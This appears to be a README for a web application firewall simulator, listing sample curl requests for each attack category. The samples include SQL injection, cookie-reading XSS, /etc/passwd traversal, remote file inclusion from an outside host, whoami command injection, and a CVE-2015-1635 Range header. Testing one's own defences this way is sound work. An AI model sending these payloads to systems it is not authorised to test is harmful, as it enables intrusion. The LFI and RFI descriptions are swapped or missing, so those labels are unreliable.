# KSD Simulator

## Web Attack Tool

Identifies common application-level attack tools including vulnerability scanning, exploit tools and DoS programs like Pandora, Drive, LOIC, and Hulk.

Sample Attack Simulation:
This is an example request with a User-Agent string value of a well-known open source web application vulnerability scanner. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/" --user-agent "w3af.sourceforge.net"
```

## Web Protocal Attack

Identifies errors and anomalies related to the HTTP protocol including request body parsing errors and RFC violations like required request headers that are missing.

Sample Attack Simulation:
This is an example request where the Content-Type header specifies the request body content is “xml”, but doesn’t pass the data in XML format. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/" --header "Content-Type: application/xml" --data "not_xml_format"
```

SQL Injection

Identifies database attack payloads, including those used during the initial reconnaissance phase of an attack session to enumerate database details, as well as data exfiltration attempts and timing-based enumerations. The group evaluates incoming payloads using a library of attack fingerprints that our security research team updates continuously.

Sample Attack Simulation:
This is an example SQLi attack that attempts to enumerate the database version in use. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/?fakeparam=-1%20UNION%20ALL%20SELECT%20%40%40version%2C2%2C3--"
```

## Cross-Site Scripting

Blocks proof-of-concept attacks that attempt to identify exploit vectors, JavaScript event handler invocations, and attempts to access sensitive DOM objects.

Sample Attack Simulation:
This is an example XSS attack that attempts to trigger the JavaScript prompt function and display the current user’s cookie information. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/?fakeparam=data%22%3E%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E"
```

## Local File Inclusion

``` Bash
curl -D - -s "http://${HOSTNAME}/?fakeparam=.././.././../etc/passwd"
```

## Remote File Inclusion

Identifies attacks including directory traversals, as well as attempts to access sensitive application configuration and operating system files.

Sample Attack Simulation:
This is an example LFI attack that attempts to directory traversal to access the operating system’s password file. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/?fakeparam=http://cirt.net/rfiinc.txt"
```

## Command Injection

Identifies attempts to access and execute application-level and operating system commands including PHP code injection and web Bash/backdoor upload attempts.

Sample Attack Simulation:
This is an example CMDi attack that attempts to use the “whoami” operating system command to identify which user the web server application is running as. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/?fakeparam=something;/bin/whoami"
```

## Web Platform Attack

Identifies attacks against the software platforms (including cloud, web and application-layers) that are not categorized in other attack groups.

Sample Attack Simulation:
This is an example request that specifies a Range request header payload similar to CVE-2015-1635. You shouldn’t run attack simulations when the Penalty Box is set to Deny.

``` Bash
curl -D - -s "http://${HOSTNAME}/" --header "Range: 18446744073709551615"
```
